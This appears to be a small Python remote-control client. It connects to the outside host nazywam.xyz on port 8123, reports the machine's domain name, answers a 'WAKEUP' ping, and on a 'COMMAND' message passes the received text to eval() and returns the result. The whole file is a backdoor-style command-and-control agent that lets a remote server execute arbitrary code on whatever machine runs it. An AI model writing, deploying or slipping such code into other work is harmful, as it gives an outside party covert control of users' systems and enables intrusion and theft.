from socket import *


#specify the host and port

HOST = "nazywam.xyz"
PORT = 8123


connection = socket()

try:
	connection.connect((HOST, PORT))
except ConnectionRefusedError:
	print("ERROR: Couldn't connect, host is down?")
	exit(0)


connection.send(getfqdn())

while True:
	command = connection.recv(1024)

	print(command)

	if(command == b"WAKEUP"):
		connection.send(b"READY")

	if(command == b"COMMAND"):

		task = connection.recv(1024)
		connection.send(str.encode(str(eval(task))))
